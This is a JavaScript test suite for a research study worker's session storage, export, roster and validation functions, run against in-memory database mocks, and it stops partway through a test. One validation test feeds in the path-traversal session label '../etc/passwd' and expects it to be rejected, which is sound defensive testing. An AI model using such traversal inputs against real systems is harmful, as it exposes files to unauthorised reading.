/**
 * Self-test for worker.mjs v2 endpoints.
 *
 * Imports the worker's exported saveSessionToD1 directly and runs it against
 * a small in-memory mock of D1's binding API. Verifies:
 *   - Happy path: session row + bulk trials inserted, status "saved".
 *   - Idempotency: second POST of the same (pid, session_label) returns
 *     "already_saved" and writes no extra rows.
 *   - Empty trials array: session row created, n_trials_saved = 0.
 *   - Trial field shaping: booleans/null pass through correctly.
 *
 * Run with: node test_worker-v2.mjs
 */
import {
  saveSessionToD1,
  exportParticipantFromD1, exportAllFromD1,
  listParticipantsFromD1,
  validateSessionPayload,
  checkEnrollment,
  csvCell,
  // Metacognitive layer: copy strings, predictions, forced choices, familiarity.
  listCopyStrings, updateCopyString,
  validatePredictionPayload, validateForcedChoicePayload,
  savePrediction, saveForcedChoice,
  validateFamiliarityPayload, saveFamiliarity,
  getDebriefDataFromD1,
  // Tester edit-request (feedback) layer.
  validateEditRequestPayload, saveEditRequests,
  listEditRequests, markEditRequestResolved,
  // In-lab session password gate.
  verifySessionPassword,
} from "./worker.mjs";

let pass = 0, fail = 0;
// Compares an actual value with an expected one and records a pass or a fail.
function check(name, actual, expected) {
  const ok = (typeof expected === "object")
    ? JSON.stringify(actual) === JSON.stringify(expected)
    : actual === expected;
  if (ok) { console.log(`  pass: ${name}`); pass++; }
  else    { console.error(`  FAIL: ${name}\n    expected: ${JSON.stringify(expected)}\n    actual:   ${JSON.stringify(actual)}`); fail++; }
}

// ── D1 mock ──────────────────────────────────────────────────────────────────
// Mimics env.DB_V2's prepare()/bind()/run()/first()/batch() surface enough
// for saveSessionToD1 to exercise. Stores rows in JS arrays so each test
// gets a fresh DB.

function makeMockDB() {
  const participants  = [];  // for export tests
  const sessions      = [];
  const trials        = [];
  const predictions   = [];  // pre_session_predictions_v2
  const forcedChoices = [];  // forced_choices_v2
  const familiarityRatings = [];  // familiarity_ratings_v2
  const editRequests  = [];  // edit_requests_v2 (tester feedback)
  const copyStrings   = new Map();  // copy_strings_v2: key -> value
  let nextSessionId = 1;
  let nextTrialId   = 1;
  let nextMetacogId = 1;
  let nextFeedbackId = 1;
  const calls = { runs: 0, batches: 0, batchSizes: [] };

  // Inserts a participant row directly, for the export and roster tests.
  function seedParticipant(row) {
    participants.push({ created_at: "2026-05-21T00:00:00.000Z", ...row });
  }
  // Inserts a copy-string row directly, for the copy-string tests.
  function seedCopy(key, value) {
    copyStrings.set(key, value);
  }

  function prepare(sql) {
    return {
      _sql: sql,
      _binds: null,
      bind(...args) { this._binds = args; return this; },
      async run() {
        calls.runs++;
        const sql = this._sql;
        const b   = this._binds || [];
        // sessions_v2 INSERT OR IGNORE
        if (/^INSERT OR IGNORE INTO sessions_v2/i.test(sql)) {
          const [participant_id, phase, session_label, group_practiced,
                 started_at, completed_at, ua, device_w, device_h, tz, session_context] = b;
          const exists = sessions.find(s => s.participant_id === participant_id && s.session_label === session_label);
          if (exists) {
            return { meta: { changes: 0, last_row_id: exists.id } };
          }
          const row = {
            id: nextSessionId++,
            participant_id, phase, session_label, group_practiced,
            started_at, completed_at, ua, device_w, device_h, tz, session_context,
          };
          sessions.push(row);
          return { meta: { changes: 1, last_row_id: row.id } };
        }
        // trials_v2 INSERT (called via batch; run() is exposed as well).
        // Column 18 is confidence, which is nullable.
        if (/^INSERT INTO trials_v2/i.test(sql)) {
          const [session_id, participant_id, item_id, group_id, feature, full_name,
                 qtype, raw_answer, correct, rt_ms, review_ms,
                 stim_on_ts, stim_off_ts, trial_order,
                 timed_out, retry_attempt, soft_capped, confidence] = b;
          const row = {
            id: nextTrialId++,
            session_id, participant_id, item_id, group_id, feature, full_name,
            qtype, raw_answer, correct, rt_ms, review_ms,
            stim_on_ts, stim_off_ts, trial_order,
            timed_out, retry_attempt, soft_capped, confidence,
          };
          trials.push(row);
          return { meta: { changes: 1, last_row_id: row.id } };
        }
        // pre_session_predictions_v2 INSERT OR IGNORE
        if (/^INSERT OR IGNORE INTO pre_session_predictions_v2/i.test(sql)) {
          const [participant_id, session_label, value] = b;
          const exists = predictions.find(p => p.participant_id === participant_id && p.session_label === session_label);
          if (exists) return { meta: { changes: 0, last_row_id: exists.id } };
          const row = { id: nextMetacogId++, participant_id, session_label, value,
                        created_at: new Date().toISOString() };
          predictions.push(row);
          return { meta: { changes: 1, last_row_id: row.id } };
        }
        // forced_choices_v2 INSERT OR IGNORE
        if (/^INSERT OR IGNORE INTO forced_choices_v2/i.test(sql)) {
          const [participant_id, checkpoint, choice, confidence] = b;
          const exists = forcedChoices.find(f => f.participant_id === participant_id && f.checkpoint === checkpoint);
          if (exists) return { meta: { changes: 0, last_row_id: exists.id } };
          const row = { id: nextMetacogId++, participant_id, checkpoint, choice, confidence,
                        created_at: new Date().toISOString() };
          forcedChoices.push(row);
          return { meta: { changes: 1, last_row_id: row.id } };
        }
        // familiarity_ratings_v2 INSERT OR IGNORE
        if (/^INSERT OR IGNORE INTO familiarity_ratings_v2/i.test(sql)) {
          const [participant_id, checkpoint, item_id, group_id, feature, full_name, value] = b;
          const exists = familiarityRatings.find(f => f.participant_id === participant_id && f.item_id === item_id);
          if (exists) return { meta: { changes: 0, last_row_id: exists.id } };
          const row = { id: nextMetacogId++, participant_id, checkpoint, item_id, group_id, feature, full_name, value,
                        created_at: new Date().toISOString() };
          familiarityRatings.push(row);
          return { meta: { changes: 1, last_row_id: row.id } };
        }
        // copy_strings_v2 UPDATE
        if (/^UPDATE copy_strings_v2/i.test(sql)) {
          const [value, key] = b;
          if (copyStrings.has(key)) {
            copyStrings.set(key, value);
            return { meta: { changes: 1 } };
          }
          return { meta: { changes: 0 } };
        }
        // edit_requests_v2 INSERT (one row per pin, via batch())
        if (/^INSERT INTO edit_requests_v2/i.test(sql)) {
          const [batch_id, pid, reporter, page, page_url, viewport, ua,
                 note, selector, element_text, selected_text, pos] = b;
          const row = { id: nextFeedbackId++, batch_id, pid, reporter, page, page_url,
                        viewport, ua, note, selector, element_text, selected_text, pos,
                        resolved: 0, resolved_at: null, created_at: new Date().toISOString() };
          editRequests.push(row);
          return { meta: { changes: 1, last_row_id: row.id } };
        }
        // edit_requests_v2 UPDATE (resolve / reopen by id or batch_id)
        if (/^UPDATE edit_requests_v2/i.test(sql)) {
          const [val, at, key] = b;
          const byBatch = /WHERE batch_id = \?/i.test(sql);
          let changes = 0;
          for (const r of editRequests) {
            if (byBatch ? r.batch_id === key : r.id === key) {
              r.resolved = val; r.resolved_at = at; changes++;
            }
          }
          return { meta: { changes } };
        }
        throw new Error(`mock DB: unknown run() SQL: ${sql.slice(0, 60)}...`);
      },
      async first() {
        const sql = this._sql;
        const b   = this._binds || [];
        if (/^SELECT id FROM sessions_v2 WHERE participant_id = \? AND session_label = \?$/i.test(sql)) {
          const [pid, label] = b;
          const row = sessions.find(s => s.participant_id === pid && s.session_label === label);
          return row ? { id: row.id } : null;
        }
        // Orphan-recovery check used by saveSessionToD1.
        if (/^SELECT COUNT\(\*\) AS n FROM trials_v2 WHERE session_id = \?$/i.test(sql)) {
          const [sessionId] = b;
          return { n: trials.filter(t => t.session_id === sessionId).length };
        }
        // Enrollment check used by handleV2SessionComplete / checkEnrollment.
        if (/^SELECT 1 AS ok FROM participants_v2 WHERE pid = \?$/i.test(sql)) {
          const [pid] = b;
          return participants.find(p => p.pid === pid) ? { ok: 1 } : null;
        }
        // copy_strings_v2 existence check (used by updateCopyString).
        if (/^SELECT 1 AS ok FROM copy_strings_v2 WHERE key = \?$/i.test(sql)) {
          const [key] = b;
          return copyStrings.has(key) ? { ok: 1 } : null;
        }
        // export: participant lookup. /s flag lets . match newlines (the SQL
        // string spans multiple lines).
        if (/^SELECT pid, option_id,.*FROM participants_v2 WHERE pid = \?$/is.test(sql)) {
          const [pid] = b;
          return participants.find(p => p.pid === pid) || null;
        }
        throw new Error(`mock DB: unknown first() SQL: ${sql.slice(0, 60)}...`);
      },
      async all() {
        const sql = this._sql;
        const b   = this._binds || [];
        // export: sessions for a participant
        if (/FROM sessions_v2\s+WHERE participant_id = \?\s+ORDER BY id ASC/is.test(sql)) {
          const [pid] = b;
          const rows = sessions.filter(s => s.participant_id === pid)
                               .sort((a, b) => a.id - b.id);
          return { results: rows };
        }
        // export: trials for a participant
        if (/FROM trials_v2\s+WHERE participant_id = \?\s+ORDER BY session_id ASC, trial_order ASC/is.test(sql)) {
          const [pid] = b;
          const rows = trials.filter(t => t.participant_id === pid)
                             .sort((a, b) => a.session_id - b.session_id || a.trial_order - b.trial_order);
          return { results: rows };
        }
        // export-all: all participants
        if (/FROM participants_v2\s+ORDER BY pid ASC/is.test(sql)) {
          return { results: [...participants].sort((a, b) => a.pid.localeCompare(b.pid)) };
        }
        // export-all: all sessions
        if (/FROM sessions_v2\s+ORDER BY participant_id ASC, id ASC/is.test(sql)) {
          return { results: [...sessions].sort((a, b) =>
            a.participant_id.localeCompare(b.participant_id) || a.id - b.id) };
        }
        // export-all: all trials
        if (/FROM trials_v2\s+ORDER BY session_id ASC, trial_order ASC/is.test(sql)) {
          return { results: [...trials].sort((a, b) =>
            a.session_id - b.session_id || a.trial_order - b.trial_order) };
        }
        // list-participants: roster sorted by enrollment_date DESC
        if (/FROM participants_v2\s+ORDER BY enrollment_date DESC, pid ASC/is.test(sql)) {
          const rows = [...participants].sort((a, b) => {
            const tCmp = (b.enrollment_date || "").localeCompare(a.enrollment_date || "");
            return tCmp !== 0 ? tCmp : a.pid.localeCompare(b.pid);
          });
          return { results: rows };
        }
        // list-participants: session counts per participant (GROUP BY)
        if (/SELECT participant_id,\s+COUNT\(\*\) AS n\s+FROM sessions_v2\s+GROUP BY participant_id/is.test(sql)) {
          const counts = new Map();
          for (const s of sessions) {
            counts.set(s.participant_id, (counts.get(s.participant_id) || 0) + 1);
          }
          return { results: Array.from(counts, ([participant_id, n]) => ({ participant_id, n })) };
        }
        // export (single PID): predictions for a participant
        if (/FROM pre_session_predictions_v2\s+WHERE participant_id = \?/is.test(sql)) {
          const [pid] = b;
          const rows = predictions.filter(r => r.participant_id === pid)
                                  .sort((a, b) => (a.created_at || "").localeCompare(b.created_at || ""))
                                  .map(({ participant_id, id, ...rest }) => rest);
          return { results: rows };
        }
        // export (single PID): forced_choices for a participant
        if (/FROM forced_choices_v2\s+WHERE participant_id = \?/is.test(sql)) {
          const [pid] = b;
          const rows = forcedChoices.filter(r => r.participant_id === pid)
                                    .sort((a, b) => (a.created_at || "").localeCompare(b.created_at || ""))
                                    .map(({ participant_id, id, ...rest }) => rest);
          return { results: rows };
        }
        // export (single PID): familiarity for a participant
        if (/FROM familiarity_ratings_v2\s+WHERE participant_id = \?/is.test(sql)) {
          const [pid] = b;
          const rows = familiarityRatings.filter(r => r.participant_id === pid)
                                         .sort((a, b) => (a.created_at || "").localeCompare(b.created_at || ""))
                                         .map(({ participant_id, id, ...rest }) => rest);
          return { results: rows };
        }
        // export-all: all predictions, ordered by participant then created_at
        if (/FROM pre_session_predictions_v2\s+ORDER BY participant_id ASC, created_at ASC/is.test(sql)) {
          const rows = [...predictions].sort((a, b) =>
            a.participant_id.localeCompare(b.participant_id) ||
            (a.created_at || "").localeCompare(b.created_at || ""))
            .map(({ id, ...rest }) => rest);
          return { results: rows };
        }
        // export-all: all forced_choices
        if (/FROM forced_choices_v2\s+ORDER BY participant_id ASC, created_at ASC/is.test(sql)) {
          const rows = [...forcedChoices].sort((a, b) =>
            a.participant_id.localeCompare(b.participant_id) ||
            (a.created_at || "").localeCompare(b.created_at || ""))
            .map(({ id, ...rest }) => rest);
          return { results: rows };
        }
        // export-all: all familiarity ratings
        if (/FROM familiarity_ratings_v2\s+ORDER BY participant_id ASC, created_at ASC/is.test(sql)) {
          const rows = [...familiarityRatings].sort((a, b) =>
            a.participant_id.localeCompare(b.participant_id) ||
            (a.created_at || "").localeCompare(b.created_at || ""))
            .map(({ id, ...rest }) => rest);
          return { results: rows };
        }
        // listCopyStrings: SELECT key, value FROM copy_strings_v2 ORDER BY key ASC
        if (/SELECT key, value FROM copy_strings_v2 ORDER BY key ASC/is.test(sql)) {
          const rows = Array.from(copyStrings.entries(), ([key, value]) => ({ key, value }))
                            .sort((a, b) => a.key.localeCompare(b.key));
          return { results: rows };
        }
        // listEditRequests: FROM edit_requests_v2 [WHERE resolved=?] ORDER BY created_at DESC, id DESC
        if (/FROM edit_requests_v2/is.test(sql)) {
          let rows = [...editRequests];
          if (/WHERE resolved = \?/i.test(sql)) {
            const [resolved] = b;
            rows = rows.filter(r => r.resolved === resolved);
          }
          rows.sort((a, b) =>
            (b.created_at || "").localeCompare(a.created_at || "") || (b.id - a.id));
          return { results: rows };
        }
        throw new Error(`mock DB: unknown all() SQL: ${sql.slice(0, 60)}...`);
      },
    };
  }

  // Runs prepared statements in order and records the batch size.
  async function batch(stmts) {
    calls.batches++;
    calls.batchSizes.push(stmts.length);
    for (const s of stmts) await s.run();
    return [];
  }

  return {
    prepare, batch,
    _seedParticipant: seedParticipant,
    _seedCopy:        seedCopy,
    _dump: () => ({
      participants, sessions, trials,
      predictions, forcedChoices, familiarityRatings, editRequests,
      copyStrings: Object.fromEntries(copyStrings),
      calls,
    }),
  };
}

// ── R2 mock ──────────────────────────────────────────────────────────────────
// Mimics env.RESULTS's put(key, body, opts) surface.

function makeMockR2({ failOnPut = false } = {}) {
  const objects = new Map();
  return {
    async put(key, body, putOpts) {
      if (failOnPut) throw new Error("R2 put rejected (mock)");
      objects.set(key, { body, opts: putOpts });
      return { etag: "fake-etag", uploaded: new Date().toISOString() };
    },
    _dump: () => objects,
  };
}

// ── Test payloads ────────────────────────────────────────────────────────────

// Builds one trial object, with any field overridden by the caller.
function trial(overrides = {}) {
  return {
    item_id: "C1-S1-al",
    group_id: "C-1",
    feature: "al",
    full_name: "ethanal",
    qtype: "Q-blank",
    raw_answer: "al",
    correct: true,
    rt_ms: 3200,
    review_ms: 1500,
    stim_on_ts:  "2026-05-21T10:00:00.000Z",
    stim_off_ts: "2026-05-21T10:00:03.200Z",
    trial_order: 1,
    timed_out: false,
    retry_attempt: 1,
    soft_capped: false,
    ...overrides,
  };
}

// Builds one session-complete payload of two trials, with any field overridden
// by the caller.
function payload(overrides = {}) {
  return {
    pid: "01-DEV01",
    phase: "spaced",
    session_label: "spaced-S1",
    group_practiced: "C-1",
    started_at: "2026-05-21T10:00:00.000Z",
    completed_at: "2026-05-21T10:08:00.000Z",
    device_w: 1920,
    device_h: 1080,
    tz: "America/Toronto",
    session_context: "online",
    trials: [trial({ trial_order: 1 }), trial({ trial_order: 2, item_id: "C1-S1-amide", feature: "amide", full_name: "hexanamide" })],
    ...overrides,
  };
}

// ── Tests ───────────────────────────────────────────────────────────────────

// A complete payload writes one session row and its trials in a single batch.
console.log("\n== saveSessionToD1: happy path ==");
{
  const db = makeMockDB();
  const result = await saveSessionToD1(db, payload(), { ua: "TestUA/1.0" });
  check("status saved",        result.status,         "saved");
  check("session_id returned", typeof result.session_id, "number");
  check("n_trials_saved = 2",  result.n_trials_saved, 2);

  const dump = db._dump();
  check("1 session row written", dump.sessions.length, 1);
  check("2 trial rows written",  dump.trials.length,    2);
  check("trials linked to session",
        dump.trials.every(t => t.session_id === result.session_id), true);
  check("UA captured",           dump.sessions[0].ua, "TestUA/1.0");
  check("group_practiced stored", dump.sessions[0].group_practiced, "C-1");
  check("batch() used once",     dump.calls.batches, 1);
  check("batch size = 2",        dump.calls.batchSizes[0], 2);
}

// Posting the same participant and session label twice adds no further rows.
console.log("\n== saveSessionToD1: idempotency (duplicate POST) ==");
{
  const db = makeMockDB();
  // First save.
  const a = await saveSessionToD1(db, payload());
  check("first call status saved", a.status, "saved");
  // Second save — same pid+session_label.
  const b = await saveSessionToD1(db, payload());
  check("second call status already_saved", b.status, "already_saved");
  check("second call n_trials_saved = 0",    b.n_trials_saved, 0);
  check("same session_id returned",          b.session_id, a.session_id);

  const dump = db._dump();
  check("still only 1 session row", dump.sessions.length, 1);
  check("still only 2 trial rows",  dump.trials.length,    2);
}

// A payload with no trials still creates the session row and skips the batch.
console.log("\n== saveSessionToD1: empty trials array ==");
{
  const db = makeMockDB();
  const result = await saveSessionToD1(db, payload({ trials: [] }));
  check("status saved",         result.status,         "saved");
  check("n_trials_saved = 0",   result.n_trials_saved, 0);
  const dump = db._dump();
  check("session row written",  dump.sessions.length, 1);
  check("no trial rows",        dump.trials.length,   0);
  check("batch() not called",   dump.calls.batches,   0);
}

// Booleans and nulls on a trial are stored as 1, 0 and null.
console.log("\n== saveSessionToD1: trial field shaping ==");
{
  const db = makeMockDB();
  await saveSessionToD1(db, payload({
    trials: [
      trial({ trial_order: 1, correct: true,  timed_out: false, soft_capped: false }),
      trial({ trial_order: 2, correct: false, timed_out: true,  soft_capped: true, item_id: "C1-S1-amide", feature: "amide", full_name: "hexanamide" }),
      trial({ trial_order: 3, correct: null,  timed_out: false, soft_capped: false, raw_answer: null, item_id: "C1-S1-eth", feature: "eth", full_name: "ethane" }),
    ],
  }));
  const dump = db._dump();
  check("correct=true  -> 1",  dump.trials[0].correct, 1);
  check("correct=false -> 0",  dump.trials[1].correct, 0);
  check("correct=null  -> null", dump.trials[2].correct, null);
  check("timed_out=false -> 0", dump.trials[0].timed_out, 0);
  check("timed_out=true  -> 1", dump.trials[1].timed_out, 1);
  check("soft_capped=true -> 1", dump.trials[1].soft_capped, 1);
  check("raw_answer null preserved", dump.trials[2].raw_answer, null);
}

// Two session labels for one participant produce two separate session rows.
console.log("\n== saveSessionToD1: different sessions, same pid ==");
{
  const db = makeMockDB();
  await saveSessionToD1(db, payload({ session_label: "spaced-S1", trials: [trial()] }));
  await saveSessionToD1(db, payload({ session_label: "spaced-S2", trials: [trial()] }));
  const dump = db._dump();
  check("2 session rows", dump.sessions.length, 2);
  check("2 trial rows",   dump.trials.length,   2);
  const sessionIds = dump.trials.map(t => t.session_id);
  check("trial 1 attached to session 1", sessionIds[0] !== sessionIds[1], true);
}

// A fresh save also mirrors the payload to R2 under a per-session key.
console.log("\n== saveSessionToD1: R2 backup mirror on fresh save ==");
{
  const db = makeMockDB();
  const r2 = makeMockR2();
  const result = await saveSessionToD1(db, payload(), { ua: "TestUA", r2Bucket: r2 });
  check("D1 status saved",        result.status, "saved");
  const r2Dump = r2._dump();
  check("R2 received 1 object",   r2Dump.size, 1);
  const key = "sessions_v2/01-DEV01/spaced-S1.json";
  check("R2 key matches convention", r2Dump.has(key), true);
  const obj  = r2Dump.get(key);
  const body = JSON.parse(obj.body);
  check("R2 body has session_id",    typeof body.session_id, "number");
  check("R2 body preserves payload", body.payload.pid,       "01-DEV01");
  check("R2 body trials count",      body.payload.trials.length, 2);
  check("R2 content-type set",       obj.opts.httpMetadata.contentType, "application/json");
}

// A duplicate save writes no second R2 object.
console.log("\n== saveSessionToD1: R2 backup NOT called on idempotent retry ==");
{
  const db = makeMockDB();
  const r2 = makeMockR2();
  await saveSessionToD1(db, payload(), { r2Bucket: r2 });  // first call: R2 put #1
  await saveSessionToD1(db, payload(), { r2Bucket: r2 });  // duplicate: should skip R2
  check("R2 still has 1 object (no double-write)", r2._dump().size, 1);
}

// A failing R2 put leaves the D1 session and trial rows in place.
console.log("\n== saveSessionToD1: R2 failure does not fail the save ==");
{
  const db = makeMockDB();
  const r2 = makeMockR2({ failOnPut: true });
  // Silence the expected console.error from the worker.
  const origErr = console.error;
  console.error = () => {};
  try {
    const result = await saveSessionToD1(db, payload(), { r2Bucket: r2 });
    check("D1 status still saved",  result.status,         "saved");
    check("D1 trials still written", db._dump().trials.length, 2);
  } finally {
    console.error = origErr;
  }
}

// The save completes when no R2 bucket is supplied.
console.log("\n== saveSessionToD1: no R2 binding (legacy behavior) ==");
{
  const db = makeMockDB();
  const result = await saveSessionToD1(db, payload());   // no r2Bucket in opts
  check("D1 status saved",   result.status, "saved");
  check("D1 trials written", db._dump().trials.length, 2);
}

// A single-participant export nests each session's trials under that session.
console.log("\n== exportParticipantFromD1: happy path ==");
{
  const db = makeMockDB();
  db._seedParticipant({
    pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T00:00:00.000Z",
    dev_mode: 1, ua: "TestUA/1.0", tz: "America/Toronto",
  });
  await saveSessionToD1(db, payload(), { ua: "TestUA/1.0" });
  await saveSessionToD1(db, payload({
    session_label: "spaced-S2",
    trials: [trial({ trial_order: 1, item_id: "C1-S2-amide" })],
  }), { ua: "TestUA/1.0" });

  const data = await exportParticipantFromD1(db, "01-DEV01");
  check("participant present",       !!data.participant,          true);
  check("participant pid",           data.participant.pid,        "01-DEV01");
  check("participant option_id",     data.participant.option_id,  "option1");
  check("2 sessions returned",       data.sessions.length,        2);
  check("session 1 has 2 trials",    data.sessions[0].trials.length, 2);
  check("session 2 has 1 trial",     data.sessions[1].trials.length, 1);
  check("session 1 trial 0 item",    data.sessions[0].trials[0].item_id, "C1-S1-al");
  check("session 1 trial 1 item",    data.sessions[0].trials[1].item_id, "C1-S1-amide");
  check("session 2 trial item",      data.sessions[1].trials[0].item_id, "C1-S2-amide");
  // session_id field is stripped from nested trials (it's redundant under the parent session).
  check("session_id not on nested trial", "session_id" in data.sessions[0].trials[0], false);
}

// An export for an unenrolled participant id returns null.
console.log("\n== exportParticipantFromD1: unknown PID ==");
{
  const db = makeMockDB();
  const data = await exportParticipantFromD1(db, "99-XYZ");
  check("unknown pid -> null", data, null);
}

// An enrolled participant with no sessions exports with an empty session list.
console.log("\n== exportParticipantFromD1: enrolled but no sessions ==");
{
  const db = makeMockDB();
  db._seedParticipant({
    pid: "02-DEV01", option_id: "option2",
    enrollment_date: "2026-05-21T00:00:00.000Z",
    dev_mode: 1, ua: "", tz: "America/Toronto",
  });
  const data = await exportParticipantFromD1(db, "02-DEV01");
  check("participant present",       !!data.participant, true);
  check("zero sessions",             data.sessions.length, 0);
}

// Export-all groups each session and trial under the participant it belongs to.
console.log("\n== exportAllFromD1: multiple participants ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-20T00:00:00.000Z", dev_mode: 1, ua: "", tz: "America/Toronto" });
  db._seedParticipant({ pid: "02-DEV01", option_id: "option2",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "America/Toronto" });
  // Two sessions for participant 1, one for participant 2.
  await saveSessionToD1(db, payload({ pid: "01-DEV01", session_label: "spaced-S1" }));
  await saveSessionToD1(db, payload({ pid: "01-DEV01", session_label: "spaced-S2", trials: [trial({ trial_order: 1, item_id: "C1-S2-eth" })] }));
  await saveSessionToD1(db, payload({ pid: "02-DEV01", phase: "spaced", group_practiced: "C-2",
    session_label: "spaced-S1", trials: [trial({ trial_order: 1, item_id: "C2-S1-benzene" })] }));

  const rows = await exportAllFromD1(db);
  check("2 participants returned",       rows.length, 2);
  check("first is 01-DEV01",             rows[0].participant.pid, "01-DEV01");
  check("first has 2 sessions",          rows[0].sessions.length, 2);
  check("first session 1 has 2 trials",  rows[0].sessions[0].trials.length, 2);
  check("first session 2 has 1 trial",   rows[0].sessions[1].trials.length, 1);
  check("second is 02-DEV01",            rows[1].participant.pid, "02-DEV01");
  check("second has 1 session",          rows[1].sessions.length, 1);
  check("second session has 1 trial",    rows[1].sessions[0].trials.length, 1);
  check("nested trials have no session_id leak",
        "session_id" in rows[0].sessions[0].trials[0], false);
  check("nested sessions have no participant_id leak",
        "participant_id" in rows[0].sessions[0], false);
}

// Export-all returns an empty array when no participants exist.
console.log("\n== exportAllFromD1: empty DB ==");
{
  const db = makeMockDB();
  const rows = await exportAllFromD1(db);
  check("empty array", rows.length, 0);
}

// Export-all includes a participant who has completed no sessions.
console.log("\n== exportAllFromD1: enrolled participant with no sessions ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "03-DEV02", option_id: "option1",
    enrollment_date: "2026-05-22T00:00:00.000Z", dev_mode: 1, ua: "", tz: "UTC" });
  const rows = await exportAllFromD1(db);
  check("1 participant returned", rows.length, 1);
  check("sessions empty",         rows[0].sessions.length, 0);
}

// The roster is empty when no participants are enrolled.
console.log("\n== listParticipantsFromD1: empty DB ==");
{
  const db = makeMockDB();
  const rows = await listParticipantsFromD1(db);
  check("empty array", rows.length, 0);
}

// The roster sorts by enrollment date, counts sessions per participant, and
// carries the dev_mode flag.
console.log("\n== listParticipantsFromD1: multiple participants with varying session counts ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "03-12345", option_id: "option1",
    enrollment_date: "2026-05-20T10:00:00.000Z", dev_mode: 0, ua: "", tz: "America/Toronto" });
  db._seedParticipant({ pid: "04-67890", option_id: "option2",
    enrollment_date: "2026-05-22T10:00:00.000Z", dev_mode: 0, ua: "", tz: "America/Toronto" });
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T10:00:00.000Z", dev_mode: 1, ua: "", tz: "America/Toronto" });
  // Participant 03 has 2 sessions; 04 has 1; 01-DEV01 has 0.
  await saveSessionToD1(db, payload({ pid: "03-12345", session_label: "spaced-S1" }));
  await saveSessionToD1(db, payload({ pid: "03-12345", session_label: "spaced-S2",
    trials: [trial({ trial_order: 1, item_id: "x" })] }));
  await saveSessionToD1(db, payload({ pid: "04-67890", session_label: "pretest", phase: "pretest",
    group_practiced: null, trials: [trial({ trial_order: 1, item_id: "y" })] }));

  const rows = await listParticipantsFromD1(db);
  check("3 rows returned",             rows.length, 3);
  // enrollment_date DESC: 04 (May 22) → 01-DEV01 (May 21) → 03 (May 20)
  check("sorted by enrollment_date DESC",
        rows.map(r => r.pid), ["04-67890", "01-DEV01", "03-12345"]);
  check("03 has 2 sessions",           rows.find(r => r.pid === "03-12345").n_sessions, 2);
  check("04 has 1 session",            rows.find(r => r.pid === "04-67890").n_sessions, 1);
  check("01-DEV01 has 0 sessions",     rows.find(r => r.pid === "01-DEV01").n_sessions, 0);
  check("01-DEV01 dev_mode flag set",  rows.find(r => r.pid === "01-DEV01").dev_mode, 1);
}

// A clean session payload produces no validation errors.
console.log("\n== validateSessionPayload: happy path passes ==");
{
  const errors = validateSessionPayload(payload());
  check("no errors on a clean payload", errors, null);
}

// Only a session label on the allowlist is accepted.
console.log("\n== validateSessionPayload: session_label allowlist ==");
{
  const ok = validateSessionPayload(payload({ session_label: "spaced-S1" }));
  check("known label accepted", ok, null);

  const bad = validateSessionPayload(payload({ session_label: "spaced-S5" }));
  check("unknown label rejected", Array.isArray(bad) && bad.some(e => /session_label/.test(e)), true);

  const badFake = validateSessionPayload(payload({ session_label: "../etc/passwd" }));
  check("malicious-looking label rejected", Array.isArray(badFake) && badFake.some(e => /session_label/.test(e)), true);
}

// Only a known phase is accepted.
console.log("\n== validateSessionPayload: phase whitelist (existing behavior preserved) ==");
{
  const bad = validateSessionPayload(payload({ phase: "transfer" }));
  check("unknown phase rejected", Array.isArray(bad) && bad.some(e => /phase/.test(e)), true);
}

// A typed answer of up to 200 characters is accepted and anything longer is
// rejected.
console.log("\n== validateSessionPayload: raw_answer length cap ==");
{
  const longAns = "x".repeat(201);
  const bad = validateSessionPayload(payload({ trials: [trial({ raw_answer: longAns })] }));
  check("oversized raw_answer rejected",
        Array.isArray(bad) && bad.some(e => /raw_answer exceeds/.test(e)), true);

  const ok = validateSessionPayload(payload({ trials: [trial({ raw_answer: "x".repeat(200) })] }));
  check("exactly 200 chars accepted", ok, null);
}

// Response time must be a whole number within range, or null for a timeout.
console.log("\n== validateSessionPayload: rt_ms range ==");
{
  const tooHigh = validateSessionPayload(payload({ trials: [trial({ rt_ms: 600_001 })] }));
  check("rt_ms above max rejected",
        Array.isArray(tooHigh) && tooHigh.some(e => /rt_ms out of range/.test(e)), true);

  const negative = validateSessionPayload(payload({ trials: [trial({ rt_ms: -1 })] }));
  check("negative rt_ms rejected",
        Array.isArray(negative) && negative.some(e => /rt_ms out of range/.test(e)), true);

  const nullRt = validateSessionPayload(payload({ trials: [trial({ rt_ms: null })] }));
  check("null rt_ms accepted (timeout case)", nullRt, null);

  const float = validateSessionPayload(payload({ trials: [trial({ rt_ms: 3500.5 })] }));
  check("non-integer rt_ms rejected",
        Array.isArray(float) && float.some(e => /rt_ms out of range/.test(e)), true);
}

// Review time above the maximum is rejected.
console.log("\n== validateSessionPayload: review_ms range ==");
{
  const tooHigh = validateSessionPayload(payload({ trials: [trial({ review_ms: 600_001 })] }));
  check("review_ms above max rejected",
        Array.isArray(tooHigh) && tooHigh.some(e => /review_ms out of range/.test(e)), true);
}

// Session and trial timestamps must parse and fall inside the study window,
// though a trial may carry null timestamps.
console.log("\n== validateSessionPayload: timestamps ==");
{
  const tooEarly = validateSessionPayload(payload({ started_at: "1999-01-01T00:00:00Z" }));
  check("started_at before 2024 rejected",
        Array.isArray(tooEarly) && tooEarly.some(e => /started_at/.test(e)), true);

  const tooLate  = validateSessionPayload(payload({ completed_at: "2099-01-01T00:00:00Z" }));
  check("completed_at far future rejected",
        Array.isArray(tooLate) && tooLate.some(e => /completed_at/.test(e)), true);

  const garbage  = validateSessionPayload(payload({ started_at: "not a date" }));
  check("garbage timestamp string rejected",
        Array.isArray(garbage) && garbage.some(e => /started_at/.test(e)), true);

  const badTrialTs = validateSessionPayload(payload({ trials: [trial({ stim_on_ts: "garbage" })] }));
  check("garbage trial timestamp rejected",
        Array.isArray(badTrialTs) && badTrialTs.some(e => /stim_on_ts/.test(e)), true);

  const okMissingTs = validateSessionPayload(payload({ trials: [trial({ stim_on_ts: null, stim_off_ts: null })] }));
  check("null trial timestamps accepted", okMissingTs, null);
}

// A session row left with no trials is filled in on the next save, and the save
// after that is a no-op.
console.log("\n== saveSessionToD1: orphan-session recovery (C1 fix) ==");
{
  // Simulate the "session row inserted, trial batch failed" state by
  // running a normal save and then deleting just the trial rows.
  const db = makeMockDB();
